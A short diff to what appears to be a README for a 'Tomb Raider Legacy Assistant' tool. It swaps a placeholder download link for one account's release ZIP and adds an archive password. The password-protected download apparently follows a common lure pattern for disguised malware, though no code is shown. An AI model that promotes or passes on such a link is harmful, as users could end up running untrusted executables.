@@ -6,7 +6,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/Tomb-Raider-Legacy-Assistant/releases/latest/download/TombRaider-Assistant.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/Bekkahlander/Tomb-Raider-Legacy-Assistant/releases/download/download/TombRaider_Assistant.zip)
 
 🔐 Archive password: `5868781`
 
